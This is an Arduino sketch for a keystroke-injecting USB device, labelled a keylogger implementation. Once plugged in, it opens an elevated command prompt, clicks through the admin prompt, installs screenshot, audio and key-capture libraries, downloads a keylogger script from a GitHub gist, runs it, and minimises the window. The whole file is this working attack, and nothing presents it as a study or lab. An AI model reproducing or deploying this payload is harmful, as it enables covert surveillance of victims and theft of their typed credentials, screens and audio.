// Logan Wilmoth
// Keylogger USB Implementation

#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("cmd");
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(1500);

  Keyboard.print("cd %USERPROFILE%\\Downloads");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("pip install pyscreenshot sounddevice pynput numpy");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("powershell -Command \"Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/wilmothl12/b6e22cce7d2f27f228bd3b14328d4052/raw/5bdce08cbd84ac0d1d48bc174b82b7a5131fe4bb/keyloggerusb.py' -OutFile 'keylogger.py'\"");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  

  Keyboard.print("python keylogger.py");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("n");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.end();
}

void loop() {}